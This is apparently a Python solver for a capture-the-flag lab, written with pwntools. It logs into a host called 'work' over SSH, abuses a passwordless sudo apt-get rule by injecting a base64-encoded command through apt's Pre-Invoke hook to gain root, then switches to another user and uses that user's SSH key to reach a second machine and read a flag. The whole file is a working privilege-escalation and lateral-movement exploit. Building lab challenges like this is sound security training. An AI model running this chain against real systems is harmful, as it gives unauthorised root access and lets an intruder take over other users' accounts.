#!/usr/bin/env python3
"""Solver for the multi-container privilege-escalation example.

Chain: log into `work` as Eve with the issued credentials, abuse the
passwordless `sudo apt-get` rule so apt's Pre-Invoke hook runs code as root,
then (as root) become Alice's work account and SSH to her home machine with
her key to read the flag.

The whole chain runs as a single non-interactive command and the flag is
fenced by markers, so the solver never depends on shell prompt strings.
"""
import base64
import json

from pwnlib.tubes import ssh

with open("metadata.json") as f:
    md = json.load(f)

MARKER = "___FLAG___"

# Runs as root via apt's Pre-Invoke hook: switch to asmith and use his key and
# SSH config to reach Alice's home machine and print the flag between markers.
pivot = (
    "su - asmith -c "
    "'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    "home cat flag.txt'"
)
# base64 keeps the nested quoting out of the apt option we pass on the command line.
hook = f"echo {MARKER}; echo {base64.b64encode(pivot.encode()).decode()} | base64 -d | bash; echo {MARKER}"
# Empty apt sources keep `apt-get update` from reaching the network: the
# Pre-Invoke hook still runs as root, but the command returns immediately.
command = (
    "sudo apt-get update "
    "-o Dir::Etc::sourcelist=/dev/null -o Dir::Etc::sourceparts=/dev/null "
    f'-o APT::Update::Pre-Invoke::="{hook}" 2>/dev/null'
)

s = ssh.ssh(host="work", user=md["username"], password=md["password"])
# ssh.system() execs the command like `ssh host command` — no remote Python
# interpreter required (unlike run_to_end/process).  Read only up to the
# fenced flag rather than waiting for the whole command to finish.
io = s.system(command)
# Bounded reads so a broken exploit (e.g. the privesc no longer fires) fails
# with a clear error instead of hanging on the default infinite timeout.
if not io.recvuntil(MARKER.encode(), timeout=90):
    io.close()
    s.close()
    raise RuntimeError("no privilege-escalation output; the exploit did not run")
raw = io.recvuntil(MARKER.encode(), timeout=90)
io.close()
s.close()
flag = raw.split(MARKER.encode())[0].strip().decode()

with open("flag", "w") as f:
    f.write(flag)
